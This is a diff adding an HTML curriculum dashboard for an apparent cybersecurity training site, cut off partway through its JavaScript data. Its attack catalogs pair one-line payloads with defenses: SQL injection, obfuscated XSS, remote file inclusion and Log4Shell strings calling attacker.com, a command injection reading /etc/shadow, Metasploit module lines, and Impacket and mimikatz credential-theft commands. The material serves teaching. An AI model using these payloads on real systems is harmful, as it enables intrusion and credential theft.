@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefend Academy · Dashboard Columns</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #121212; --bg-card: #1e1e1e; --bg-sidebar: #1a1a1a; --fg: #ffffff; --fg-muted: #b0b0b0; --primary: #00e676;
+            --border: #353535; --accent-bg: rgba(0, 230, 118, 0.1);
+        }
+        html[data-theme="light"] {
+            --bg: #f5f7fc; --bg-card: #ffffff; --bg-sidebar: #ffffff; --fg: #1a2c3e; --fg-muted: #5c6f87; --primary: #02b3e4;
+            --border: #eef2f8; --accent-bg: rgba(2, 179, 228, 0.1);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--fg); transition: background 0.3s, color 0.3s; }
+
+        /* ========== TOP NAVIGATION ========== */
+        .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 40px; background: var(--bg-card); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 200; }
+        .nav-brand { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+        .nav-logo-icon { background: var(--primary); color: #000; width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; }
+        .nav-brand-text h1 { font-size: 1.1rem; font-weight: 800; color: var(--fg); }
+        .nav-brand-text span { font-size: 0.6rem; color: var(--fg-muted); }
+        .top-nav-links { display: flex; gap: 25px; align-items: center; }
+        .top-nav-links > a, .nav-dropdown > a { color: var(--fg-muted); text-decoration: none; font-size: 0.9rem; font-weight: 600; padding: 5px 0; border-bottom: 2px solid transparent; }
+        .top-nav-links > a:hover, .nav-dropdown > a:hover { color: var(--fg); border-bottom-color: var(--primary); }
+        .nav-dropdown { position: relative; display: inline-block; }
+        .nav-dropdown-content { display: none; position: absolute; top: 100%; left: 0; background: var(--bg-card); min-width: 260px; box-shadow: 0 8px 20px rgba(0,0,0,0.25); border: 1px solid var(--border); border-radius: 12px; padding: 8px 0; z-index: 1000; text-align: left; max-height: 400px; overflow-y: auto; }
+        .nav-dropdown-content a { color: var(--fg); padding: 10px 16px; display: block; font-size: 0.82rem; font-weight: 500; text-decoration: none; }
+        .nav-dropdown-content a:hover { background: var(--accent-bg); color: var(--primary); }
+        .nav-dropdown:hover .nav-dropdown-content { display: block; }
+        .back-btn { background: rgba(0,230,118,0.1); color: var(--primary); padding: 8px 18px; border-radius: 8px; text-decoration: none; font-size: 0.85rem; font-weight: 700; border: 1px solid var(--primary); }
+        .theme-btn { background: var(--bg); border: 1px solid var(--border); color: var(--fg); padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; }
+
+        /* ========== GRID LAYOUT ========== */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            padding: 40px;
+            max-width: 1800px;
+            margin: 0 auto;
+        }
+        .grid-column {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px;
+            height: fit-content;
+        }
+        .column-header { text-align: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
+        .column-header h2 { color: var(--primary); font-size: 1.2rem; margin-bottom: 5px; }
+        .column-header p { color: var(--fg-muted); font-size: 0.75rem; }
+
+        /* ========== TREE MENU STYLES ========== */
+        ul.tree, ul.tree ul { list-style: none; }
+        ul.tree ul { margin-left: 20px; border-left: 1px dashed var(--border); padding-left: 12px; display: none; /* Hidden by default */ }
+        ul.tree li { margin: 8px 0; position: relative; }
+        ul.tree li > span, ul.tree li > a { display: flex; align-items: center; gap: 8px; padding: 7px 10px; border-radius: 6px; text-decoration: none; color: var(--fg); font-size: 0.9rem; font-weight: 500; cursor: pointer; transition: 0.2s; }
+        ul.tree li > span:hover, ul.tree li > a:hover { background: var(--accent-bg); color: var(--primary); }
+        ul.tree li > a.active { background: var(--accent-bg); color: var(--primary); font-weight: 700; }
+        
+        .toggle-icon { width: 16px; text-align: center; font-size: 0.7rem; color: var(--fg-muted); transition: transform 0.2s; }
+        .expanded > .toggle-icon { transform: rotate(90deg); }
+        
+        .level-1 > span { font-weight: 700; font-size: 0.95rem; color: var(--primary); text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 4px; }
+        .level-1 > span:hover { background: transparent; }
+        .level-2 > a, .level-2 > span { font-weight: 600; font-size: 0.85rem; }
+        .level-3 > a, .level-3 > span { font-size: 0.8rem; color: var(--fg-muted); font-weight: 400; }
+        .level-3 > a:hover { color: var(--primary); }
+
+        /* ========== FOOTER ========== */
+        footer { margin-top: 40px; background: var(--bg-card); border-top: 1px solid var(--border); padding: 40px; }
+        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1.5fr; gap: 40px; max-width: 1200px; margin: 0 auto; }
+        .footer-col h3 { font-size: 1.1rem; color: var(--fg); margin-bottom: 15px; }
+        .footer-col p { color: var(--fg-muted); font-size: 0.85rem; line-height: 1.6; margin-bottom: 15px; }
+        .footer-col ul { list-style: none; } .footer-col ul li { margin-bottom: 10px; }
+        .footer-col ul li a { color: var(--fg-muted); text-decoration: none; font-size: 0.85rem; }
+        .footer-col ul li a:hover { color: var(--primary); }
+        .footer-bottom { text-align: center; padding-top: 20px; border-top: 1px solid var(--border); color: var(--fg-muted); font-size: 0.8rem; margin-top: 30px; }
+
+        @media (max-width: 900px) {
+            .grid-container { grid-template-columns: 1fr; padding: 20px; }
+            .top-nav { flex-direction: column; gap: 15px; }
+            .footer-grid { grid-template-columns: 1fr; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+<script>
+    const savedTheme = localStorage.getItem('cd_theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', savedTheme);
+    function toggleTheme() {
+        const current = document.documentElement.getAttribute('data-theme');
+        const next = current === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', next);
+        localStorage.setItem('cd_theme', next);
+    }
+</script>
+
+<!-- HEADER & NAVIGATION -->
+<nav class="top-nav">
+    <a href="index.html" class="nav-brand">
+        <div class="nav-logo-icon">🛡️</div>
+        <div class="nav-brand-text"><h1>CyberDefend</h1><span>Curriculum Map</span></div>
+    </a>
+    <div class="top-nav-links">
+        <div class="nav-dropdown">
+            <a href="#">Courses ▾</a>
+            <div class="nav-dropdown-content">
+                <a href="network Roadmap.html">Network Roadmap</a>
+                <a href="security Roadmap.html">Security Roadmap</a>
+                <a href="lesson-6.html">Switching Architecture</a>
+                <a href="lesson-7.html">Firewall Security</a>
+                <a href="lesson-3.html">KALI Linux</a>
+            </div>
+        </div>
+        <div class="nav-dropdown">
+            <a href="#">Labs ▾</a>
+            <div class="nav-dropdown-content">
+                <a href="begin1.html">Beginner Pentest Lab</a>
+                <a href="second.html">Attack LABS p1</a>
+                <a href="third.html">Attack LABS p2</a>
+                <a href="asa-lab.html">ASA Firewall Lab</a>
+                <a href="logs.html">Log Analysis</a>
+            </div>
+        </div>
+        <button class="theme-btn" onclick="toggleTheme()"><i class="fas fa-sun"></i> Theme</button>
+        <a href="index.html" class="back-btn">← Return to Main</a>
+    </div>
+</nav>
+
+<!-- 4-COLUMN GRID CONTAINER -->
+<div class="grid-container">
+    
+    <!-- COLUMN 1: INTERACTIVE LAB MODULES -->
+    <div class="grid-column">
+        <div class="column-header">
+            <h2>Interactive Lab Modules</h2>
+            <p>Hands-on Attack & Defense Labs</p>
+        </div>
+        <ul class="tree" id="tree1"></ul>
+    </div>
+
+    <!-- COLUMN 2: MAIN CURRICULUM (Code 1) -->
+    <div class="grid-column">
+        <div class="column-header">
+            <h2>Main Curriculum</h2>
+			 <p>Network Tracks Explained, </p>
+            <p>Roadmaps, Architecture & Security</p>
+        </div>
+        <ul class="tree" id="tree2"></ul>
+    </div>
+
+    <!-- COLUMN 3: COURSE STRUCTURE EXTRACTOR (Code 2) -->
+    <div class="grid-column">
+        <div class="column-header">
+            <h2>CyberSecurity  Course Structure</h2>
+            <p>Core Tracks & Modules</p>
+        </div>
+        <ul class="tree" id="tree3"></ul>
+    </div>
+
+    <!-- COLUMN 4: PRACTICE LABS (PACKET TRACER) -->
+    <div class="grid-column">
+        <div class="column-header">
+            <h2>Practice Labs</h2>
+            <p>Packet Tracer Exercises</p>
+        </div>
+        <ul class="tree" id="tree4"></ul>
+    </div>
+
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h3>🛡️ CyberDefend Academy</h3>
+            <p>Part of Accenture. We provide modern cybersecurity training, hands-on labs, and industry-recognized certifications to empower next-gen defenders.</p>
+        </div>
+        <div class="footer-col">
+            <h3>Explore</h3>
+            <ul>
+                <li><a href="index.html">Dashboard</a></li>
+                <li><a href="courses.html">Courses</a></li>
+                <li><a href="labs.html">Labs</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h3>Stay Connected</h3>
+            <p>Want to level up your skills? Start your journey today.</p>
+            <a href="courses.html" style="background: var(--primary); color: #000; padding: 8px 16px; border-radius: 8px; text-decoration: none; font-size: 0.8rem; font-weight: 700;">Open learning path →</a>
+        </div>
+    </div>
+    <div class="footer-bottom">© CyberDefend Academy · Part of Accenture</div>
+</footer>
+
+<script>
+    // =========================================================
+    // DATA 1: Main Curriculum (From your first code block)
+    // =========================================================
+    const curriculum1 = [
+        {
+            title: "1. Roadmaps & Overview", icon: "fa-map-location-dot",
+            children: [
+                {
+                    title: "Network Overview",
+                    children: [
+                        {
+                            title: "Network Roadmap", link: "network Roadmap.html",
+                            children: ["Network Tracks", "Certification Hierarchy", "Virtualization", "Network Simulation Programs", "Essential Tool Downloads", "Network Engineer Roadmap"]
+                        }
+                    ]
+                },
+                {
+                    title: "Security Roadmap", link: "security Roadmap.html",
+                    children: ["Cyber Security Skills You Must Learn", "Comprehensive cybersecurity skills roadmap", "Top 10 Websites Every Cybersecurity Learner Should Know", "Penetration Testing Concepts", "Top Bug Bounty Tools Kali Cheatsheet", "20 Essential SOC Tools for Every SOC Analyst", "Types of Malware", "Cybersecurity Terms Explained Simply"]
+                },
+                {
+                    title: "Cybersecurity Terms Explained", link: "attack-vectors.html",
+                    children: ["Cybersecurity Threats in OSI Model", "Penetration Testing Fundamentals", "Essential Ethical Hacking Tools", "Types of Internet Threats", "Defensive Linux Security Tools", "Offensive Linux Security", "Blue Team vs Red Team", "How Hackers Get Access", "Linux Forensic Artifacts", "Anti-Phishing Tools", "Attack Today. Defend Forever.", "Free Steganography Tools", "Cybersecurity Roadmap", "Top 10 Cybersecurity Websites", "Top 10 Cybersecurity Platforms", "SOC Logs: Eyes & Ears of Cybersecurity", "30 Days, 30 Topics: SOC Analyst Learning Plan", "Bug Bounty & Recon Cheatsheet", "Cybersecurity Skills Roadmap"]
+                }
+            ]
+        },
+        {
+            title: "2. Architecture & Devices", icon: "fa-network-wired",
+            children: [
+                {
+                    title: "Switching Architecture", link: "lesson-6.html",
+                    children: ["Port Overview & Geography", "Network Infrastructure Devices", "Access Layer & IP Phone Bridging", "Network Cables & Testing Tools", "Fiber Optic Infrastructure, SFP Modules & Splicing", "Underground Infrastructure & Fiber Cut Mapping", "Network Monitoring with Zabbix", "Phase 2: Six-Area Segmentation Design"]
+                },
+                {
+                    title: "Switch Management", link: "lesson-11.html",
+                    children: ["Remote Management", "SSH", "Secure Management Methods", "User Mode vs Privileged Mode", "RBAC & Security Delegation", "Password Management", "L2 vs L3 Switching", "SVI Inter-VLAN Routing", "Default Gateway", "Redundancy & High Availability", "Access Port vs Trunk Port", "VLANs", "Access Control Lists", "Routing: Static, Dynamic & Default", "Router on a Stick"]
+                },
+                {
+                    title: "Wireless Solutions", link: "lesson-8.html",
+                    children: ["Closed APN & Microwave Architecture", "SOTI Real-Time Monitoring & Vehicle Mount Terminals (VMT)", "Centralized Management via SOTI MobiControl", "Enterprise RFID & Logistics Tracking", "RFID Network Architecture", "Active vs. Passive RFID Tags", "Vehicle Detection & Gate Automation", "Logistics Yard Management & Exit Processing", "RFID Hardware & Reader Connectivity", "RFID Infrastructure: Tags & Readers", "Crosstalk Server", "Readers to Infrastructure Switches"]
+                },
+                {
+                    title: "VOIP", link: "lesson-12.html",
+                    children: ["Network Topology", "Cisco VOIP Switch Configuration", "DSL Integration with VoIP", "Troubleshooting"]
+                }
+            ]
+        },
+        {
+            title: "3. Security & Defense", icon: "fa-shield-halved",
+            children: [
+                {
+                    title: "Firewall Security Architecture", link: "lesson-7.html",
+                    children: ["Introduction to Firewalls", "Firewall: Packet Filtering", "Access Control Lists (ACL) & Policies", "Example Firewall Rule Table", "Applying Layered Security (Defense in Depth)", "Application Attacks", "Network Attacks", "Authentication Factors (MFA)", "Intrusion Detection (IDS) vs Prevention (IPS)", "IDS/IPS Tuning & The Confusion Matrix", "Open-Source IDS/IPS Tools: Snort & Suricata", "Example IDS Alerts Table", "Demilitarized Zone (DMZ)", "Network Address Translation (NAT)", "Virtual Private Networks (VPN)", "Centralized Logging, SIEM, EDR & XDR", "Antivirus Detection Methods"]
+                },
+                {
+                    title: "Cyber Attacks", link: "lesson-9.html",
+                    children: ["Types of Cyber Attacks", "STRIDE THREAT MODELING", "Social Engineering Attacks (Phishing, Vishing, Pretexting, Tailgating, Baiting)", "Network-Based Attacks (DDoS, MITM, DNS Spoofing / Cache Poisoning, Session Hijacking)", "Application & Web Attacks (SQL Injection, XSS, CSRF, Broken Authentication, Directory Traversal)", "Malware-Based Attacks (Ransomware, Trojans, Worms, Spyware / Adware, Cryptocurrency)", "Advanced & Persistent Threats (APT, Zero-Day Exploits, Supply Chain Attack, Polymorphic / Metamorphic Malware)", "Risk Assessment Matrices", "RISK ANALYSIS TECHNIQUES"]
+                },
+                {
+                    title: "20 Essential SOC Tools", link: "soc-tools.html"
+                }
+            ]
+        },
+        {
+            title: "4. Linux & Vulnerability Mgmt", icon: "fa-bug",
+            children: [
+                {
+                    title: "KALI Linux", link: "lesson-3.html",
+                    children: ["Kali Linux: Setup, Labs & Penetration Testing", "Download & Installation (Kali Linux | Metasploitable 2)", "Building a Virtual Penetration Testing Lab", "Integrating Kali with GNS3 & EVE-NG", "How to Use Kali for Penetration Testing"]
+                },
+                {
+                    title: "Top 50 Kali Linux Tools", link: "kali-tools.html",
+                    children: ["Wireless Security Testing (Aircrack-ng, Reaver, Wifite)", "Exploitation Frameworks (Metasploit, BeEF, SET)", "Password Cracking (John, Hashcat, Hydra, Medusa)", "Vulnerability Analysis (OpenVAS, Lynis, Wapiti)", "Forensics & Info Gathering (Maltego, Recon-ng, theHarvester, Dmitry, Autopsy)", "Reverse Engineering (Ghidra, Radare2, GDB)", "Exploitation Development (MSFVenom, Searchsploit, Pattern Create)", "Spoofing & MITM (Ettercap, Bettercap, Responder)", "Mobile Security (ADB, MobSF, Frida)", "Cryptography & Stego (Hashid, Steghide, Binwalk)", "Post-Exploitation (Mimikatz, PowerSploit, Evil-WinRM)", "Reporting & Docs (Dradis, Faraday, CherryTree, Pipal)", "Advanced Integration (Tool Chaining, Custom Dev)"]
+                },
+                {
+                    title: "Vulnerability Scanners", link: "lesson-4.html",
+                    children: ["The Penetration Testing Cycle", "False Positives & Negatives", "Types of Vulnerability Scanners", "Top Vulnerability Scanning Tools", "Reconnaissance & OSINT Tools", "Shodan: The Search Engine for the Internet of Things", "WHOIS", "Google Dorks (Google Hacking)", "Bug Bounty Hunting"]
+                },
+                {
+                    title: "Nessus Vulnerability Assessment", link: "nessus.html",
+                    children: ["Nessus Installation & Setup", "Scan Configuration", "Analyzing Results", "Extracting CVEs from Scan Results", "Export Results", "Understanding CVSS Scores", "Searching CVE Details in MITRE", "Cross-Reference with NVD", "Remediation Strategies", "Best Practices"]
+                }
+            ]
+        },
+        {
+            title: "5. Attack Simulation & Labs", icon: "fa-skull",
+            children: [
+                {
+                    title: "Attack Simulation Course Structure",
+                    children: [
+                        { title: "1. Getting Started", children: ["Where to Start & Install", "CVE, CVSS & MITRE ATT&CK"] },
+                        { title: "2. Fundamentals & Architecture", children: ["CIA Triad", "AAA (Auth, Authz, Acct)", "Cryptography & Hashing", "OSI Model & Protocols"] },
+                        { title: "3. GRC (Gov, Risk, Compliance)", children: ["NIST CSF", "ISO 27001", "PCI-DSS", "Risk Management"] },
+                        { title: "4. Network Defense (Blue Team)", children: ["Firewalls & ACLs", "IDS/IPS (Snort)", "SOC & SIEM Monitoring", "Zero Trust Arch"] },
+                        { title: "5. Offensive Ops (Red Team)", children: [
+                            "Recon (Nmap)", "Vuln Scanning (Nessus/Nmap)",
+                            { title: "Web App Attacks (OWASP)", children: ["SQL Injection (SQLi)", "Cross-Site Scripting (XSS)", "CSRF", "SSRF", "XXE", "LFI", "RFI", "Command Injection", "IDOR"] },
+                            { title: "Metasploit Framework", children: ["EternalBlue (MS17-010)", "BlueKeep (CVE-2019-0708)", "Log4Shell (CVE-2021-44228)", "VSFTPD Backdoor", "Shellshock"] },
+                            { title: "Active Directory Attacks", children: ["Kerberoasting", "AS-REP Roasting", "Pass-the-Hash (PtH)", "Golden Ticket", "DCSync"] }
+                        ]},
+                        { title: "6. DFIR (Forensics & IR)", children: ["Log Analysis (grep)", "Memory Forensics (Volatility)", "Incident Response (PICERL)"] },
+                        { title: "7. Cloud Security", children: ["AWS S3 & IAM", "Container Security"] },
+                        { title: "8. DevSecOps", children: ["SAST & Code Scanning", "CI/CD Pipeline Security"] },
+                        { title: "9. Malware Analysis", children: ["Static Analysis", "Dynamic Analysis (Sandbox)"] },
+                        { title: "10. The Kali Linux Arsenal", children: [
+                            { title: "Info Gathering & OSINT", children: ["Nmap", "Maltego", "Recon-ng", "theHarvester", "Shodan"] },
+                            { title: "Web Application Tools", children: ["Burp Suite", "OWASP ZAP", "SQLmap", "Nikto", "Gobuster"] },
+                            { title: "Exploitation Frameworks", children: ["Metasploit", "Searchsploit", "BeEF", "SET"] },
+                            { title: "Password Cracking", children: ["Hashcat", "John the Ripper", "Hydra", "Medusa"] },
+                            { title: "Sniffing & Spoofing", children: ["Wireshark", "Bettercap", "Ettercap", "Responder"] },
+                            { title: "Post-Exploitation", children: ["Mimikatz", "BloodHound", "Evil-WinRM", "PowerSploit"] },
+                            { title: "Forensics & Stego", children: ["Volatility", "Autopsy", "Binwalk", "Steghide"] }
+                        ]}
+                    ]
+                }
+            ]
+        },
+        {
+            title: "6. Troubleshooting & Voice", icon: "fa-wrench",
+            children: [
+                {
+                    title: "Troubleshooting", link: "lesson-10.html",
+                    children: ["Switch IOS Crash & Rommon Recovery", "Configuration File Management", "TFTP Server & IOS Transfers", "Upgrading the IOS Image", "Step-by-Step: IOS Recovery via TFTP Lab", "Preparing the TFTP Transfer and Initiating Copy", "Switch Troubleshooting & Network Incidents", "Switch Module Replacement", "SFP Module & Fiber Cable Speed Mismatches", "Backup Config.cfg Through TFTP", "The Management VLAN Incident", "DHCP Conflict & APIPA Problem", "Network Time Protocol (NTP)", "System Logging (Syslog)", "Simple Network Management Protocol (SNMP)"]
+                }
+            ]
+        },
+        {
+            title: "7. Cloud & Practice Labs", icon: "fa-cloud",
+            children: [
+                {
+                    title: "Cloud Computing", link: "lesson-13.html",
+                    children: ["Cloud Service Models", "Deployment Models", "Major Cloud Providers", "Core Cloud Services", "Security & IAM", "Cost Management", "Hands-On Labs"]
+                },
+                {
+                    title: "Networking Labs Overview", link: "labs2.html",
+                    children: ["Enterprise & Campus Networks labs"]
+                }
+            ]
+        }
+    ];
+
+    // Extract Interactive Lab Modules specifically for Column 1
+    const interactiveLabs = {
+        title: "Interactive Lab Modules", icon: "fa-flask",
+        children: [
+            { title: "Live Threat Monitor", link: "live-monitor.html" },
+            { title: "Beginner Pentest Lab", link: "begin1.html", children: ["Lab Setup (EVE-NG & Kali)", "Nmap Port Scanning", "Wireshark Traffic Analysis", "Metasploit Basics", "Exploiting vsftpd Backdoor"] },
+            { title: "Attack Phases Lab", link: "88888.html", children: ["Reconnaissance", "Scanning", "Exploitation", "Privilege Escalation", "Lateral Movement", "Data Exfiltration", "Erasing evidence"] },
+            { title: "Attack LABS p1", link: "second.html", children: ["ARP Spoofing MITM", "DNS Spoofing", "Rogue DHCP Server", "Wireless Evil Twin", "SQL Injection", "Cross-Site Scripting (XSS)", "Data Exfiltration (DNS Tunnel)", "Lateral Movement (Pass-the-Hash)", "Phishing Campaign (GoPhish)", "Password Brute Force", "Buffer Overflow Exploit", "Linux Privilege Escalation"] },
+            { title: "Attack LABS p2", link: "third.html", children: ["EternalBlue Exploit", "Active Directory Kerberoasting", "LFI to RCE (Log Poisoning)", "AWS S3 Bucket Exfiltration", "Command Injection", "Windows Persistence (Registry)"] },
+            { title: "Attack LABS p3", link: "fourth.html", children: ["Apache Struts 2 RCE", "VSFTPD Backdoor Exploit", "Shellshock (CGI) RCE", "Local Privilege Escalation", "Network Pivoting (Route +SOCKS)"] },
+            { title: "Switch LAB", link: "html.html", children: ["VLANs & 802.1Q Trunking", "Inter-VLAN Routing (ROAS)", "Switch Port Security", "Wireshark: ARP Spoofing Analysis", "Wireshark: DNS Exfiltration Analysis"] },
+            { title: "ASA Firewall Lab", link: "asa-lab.html", children: ["ASA Basic Setup & Security Levels", "Network Objects & Dynamic NAT", "Access Control Lists (Permit Web)", "Static NAT (Publishing Web Server)", "ACL Block - Deny Attacker IP"] },
+            { title: "Firewall Lab 2", link: "Firewal-Lab.html", children: ["1. Interfaces & Zones", "2. Routing", "3. Security Policies", "4. NAT Rules", "5. Bandwidth (QoS)", "6. VPN Configuration", "7. Logging & Alerts"] },
+            { title: "Wireshark GUI Labs", link: "wireshark-lab.html", children: ["HTTP Credentials", "TCP SYN Flood DoS", "ARP Spoofing & DHCP"] },
+            { title: "Log Analysis", link: "logs.html", children: ["Windows Event Logs", "Linux Auth Logs", "Cisco Switch Logs", "SIEM / EDR Correlation", "Apache Web Logs", "Firewall Logs", "Active Directory Logs", "AWS CloudTrail Logs"] },
+            { title: "Exploitation & Cracking", link: "crack.html", children: ["1. Recon & Nmap", "2. Web Enumeration", "3. Metasploit Exploit", "4. Hash Cracking (John)", "5. Wi-Fi Cracking", "6. SQL Injection", "7. SSH Brute Force", "8. Buffer Overflow", "9. Linux Privilege Escalation", "10. Active Directory Attack", "11. Windows SAM Cracking", "12. Email Phishing"] },
+            { title: "Active Directory Attack Lab", link: "active-directory-attack-lab.html", children: ["1. User Enumeration", "2. Group & ACL Discovery", "3. BloodHound Mapping", "4. Domain Admin Path"] },
+            { title: "Kali Toolset Console", children: ["Wireshark / T-Shark", "THC Hydra", "SQLmap", "Nikto", "Nmap"] },
+            { title: "🐉 Top 50 Kali tool CLI+ GUI", children: ["Burp Suite"] }
+        ]
+    };
+    const data1 = [interactiveLabs];
+    const data2 = curriculum1; // The full curriculum for Column 2
+
+    // =========================================================
+    // DATA 3: Extractor Curriculum (From your second code block)
+    // =========================================================
+    const data3 = [
+      { cat: "1. Getting Started", icon: "fa-rocket", modules: [
+        { id: "setup", title: "Where to Start & Install", type: "info" },
+        { id: "cve", title: "CVE, CVSS & MITRE ATT&CK", type: "info" }
+      ]},
+      { cat: "2. Fundamentals & Architecture", icon: "fa-seedling", modules: [
+        { id: "cia", title: "CIA Triad", type: "info" },
+        { id: "aaa", title: "AAA (Auth, Authz, Acct)", type: "info" },
+        { id: "crypto", title: "Cryptography & Hashing", type: "info" },
+        { id: "networking", title: "OSI Model & Protocols", type: "info" }
+      ]},
+      { cat: "3. GRC (Gov, Risk, Compliance)", icon: "fa-balance-scale", modules: [
+        { id: "nist", title: "NIST CSF", type: "info" },
+        { id: "iso", title: "ISO 27001", type: "info" },
+        { id: "pci", title: "PCI-DSS", type: "info" },
+        { id: "risk", title: "Risk Management", type: "info" }
+      ]},
+      { cat: "4. Network Defense (Blue Team)", icon: "fa-shield-halved", modules: [
+        { id: "firewalls", title: "Firewalls & ACLs", type: "cli" },
+        { id: "ids_ips", title: "IDS/IPS (Snort)", type: "cli" },
+        { id: "soc", title: "SOC & SIEM Monitoring", type: "siem" },
+        { id: "zero_trust", title: "Zero Trust Arch", type: "info" }
+      ]},
+      { cat: "5. Offensive Ops (Red Team)", icon: "fa-skull", modules: [
+        { id: "recon", title: "Recon (Nmap)", type: "cli" },
+        { id: "vuln_scanning", title: "Vuln Scanning (Nessus/Nmap)", type: "cli" },
+        { id: "web_attacks", title: "Web App Attacks (OWASP)", type: "catalog", data: [
+          { name: "SQL Injection (SQLi)", payload: "admin' OR 1=1--", tool: "sqlmap", defense: "Use Prepared Statements (Parameterized Queries).", desc: "Executing malicious SQL commands to dump databases or bypass logins." },
+          { name: "Cross-Site Scripting (XSS)", payload: "<img src=x o\\u006eerror=alert(1)>", tool: "Burp Suite", defense: "Output encoding (HTML escaping) and CSP.", desc: "Injecting client-side scripts into web pages viewed by other users." },
+          { name: "CSRF", payload: "<img src='http://bank.com/transfer?to=attacker'>", tool: "OWASP ZAP", defense: "Anti-CSRF tokens.", desc: "Forcing an authenticated user to execute unwanted actions." },
+          { name: "SSRF", payload: "http://localhost/admin_panel", tool: "Burp Suite", defense: "Whitelist allowed domains for server requests.", desc: "Forcing a server to make requests to internal resources." },
+          { name: "XXE", payload: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", tool: "Burp Suite", defense: "Disable DTD processing in XML parsers.", desc: "Exploiting XML parsers to read local files or initiate SSRF." },
+          { name: "LFI", payload: "?page=../../../../etc/passwd", tool: "Burp Suite", defense: "Whitelist allowed files; strip '../'.", desc: "Including local files on the server through the web browser." },
+          { name: "RFI", payload: "?page=http://attacker.com/shell.txt", tool: "Burp Suite", defense: "Disable allow_url_include in PHP.", desc: "Including remote files, often leading to RCE." },
+          { name: "Command Injection", payload: "; cat /etc/shadow", tool: "Commix", defense: "Use safe APIs; avoid shell commands.", desc: "Executing operating system commands on the host server." },
+          { name: "IDOR", payload: "GET /api/users/1001 -> /api/users/1002", tool: "Burp Suite", defense: "Strict access control checks on objects.", desc: "Accessing objects directly by manipulating IDs." }
+        ]},
+        { id: "metasploit", title: "Metasploit Framework", type: "catalog", data: [
+          { name: "EternalBlue (MS17-010)", payload: "use exploit/windows/smb/ms17_010_eternalblue", tool: "Metasploit", defense: "Apply MS17-010 patch; block SMB.", desc: "SMBv1 remote code execution flaw used by WannaCry." },
+          { name: "BlueKeep (CVE-2019-0708)", payload: "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce", tool: "Metasploit", defense: "Patch RDP; disable NLA.", desc: "RDP vulnerability allowing pre-auth RCE." },
+          { name: "Log4Shell (CVE-2021-44228)", payload: "${jndi:ldap://attacker.com/x}", tool: "Metasploit", defense: "Update Log4j; block outbound LDAP.", desc: "JNDI injection in Apache Log4j leading to RCE." },
+          { name: "VSFTPD Backdoor", payload: "use exploit/unix/ftp/vsftpd_234_backdoor", tool: "Metasploit", defense: "Update VSFTPD.", desc: "Malicious backdoor inserted into the VSFTPD source code." },
+          { name: "Shellshock", payload: "use exploit/multi/http/apache_mod_cgi_bash_env_exec", tool: "Metasploit", defense: "Update Bash.", desc: "Bash vulnerability allowing execution of commands via environment variables." }
+        ]},
+        { id: "ad_attacks", title: "Active Directory Attacks", type: "catalog", data: [
+          { name: "Kerberoasting", payload: "GetUserSPNs.py corp.local/user:pass -request", tool: "Impacket", defense: "Strong passwords for Service Accounts.", desc: "Requesting TGS tickets for services and cracking them offline." },
+          { name: "AS-REP Roasting", payload: "GetNPUsers.py corp.local/ -usersfile users.txt", tool: "Impacket", defense: "Disable 'Do not require Kerberos preauth'.", desc: "Requesting AS-REP tickets for users with preauth disabled." },
+          { name: "Pass-the-Hash (PtH)", payload: "crackmapexec smb 10.0.0.5 -u admin -H aad3b...", tool: "CrackMapExec", defense: "Disable NTLM; enforce Kerberos.", desc: "Authenticating using an NTLM hash instead of a password." },
+          { name: "Golden Ticket", payload: "mimikatz # kerberos::golden /user:Admin /krbtgt:HASH", tool: "Mimikatz", defense: "Protect KRBTGT; reset password twice.", desc: "Forging TGTs using the KRBTGT hash." },
+          { name: "DCSync", payload: "mimikatz # lsadump::dcsync /user:Administrator", tool: "Mimikatz", defense: "Restrict Replication privileges.", desc: "Simulating a Domain Controller to request password hashes." }
+        ]}
+      ]},
+      { cat: "6. DFIR (Forensics & IR)", icon: "fa-magnifying-glass-chart", modules: [
+        { id: "log_analysis", title: "Log Analysis (grep)", type: "cli" },
+        { id: "memory", title: "Memory Forensics (Volatility)", type: "cli" },
+        { id: "ir", title: "Incident Response (PICERL)", type: "info" }
+      ]},
+      { cat: "7. Cloud Security", icon: "fa-cloud", modules: [
+        { id: "aws", title: "AWS S3 & IAM", type: "cli" },
+        { id: "containers", title: "Container Security", type: "info" }
+      ]},
+      { cat: "8. DevSecOps", icon: "fa-code-branch", modules: [
+        { id: "sast", title: "SAST & Code Scanning", type: "info" },
+        { id: "cicd", title: "CI/CD Pipeline Security", type: "info" }
+      ]},
+      { cat: "9. Malware Analysis", icon: "fa-virus", modules: [
+        { id: "static", title: "Static Analysis", type: "cli" },
+        { id: "dynamic", title: "Dynamic Analysis (Sandbox)", type: "cli" }
+      ]},
+      { cat: "10. The Kali Linux Arsenal", icon: "fa-dragon", modules: [
+        { id: "kali_info", title: "Info Gathering & OSINT", type: "catalog", data: [
+          { name: "Nmap", payload: "nmap -sV -sC 10.10.10.5", tool: "Network Mapper", defense: "N/A", desc: "Network discovery and security auditing." },
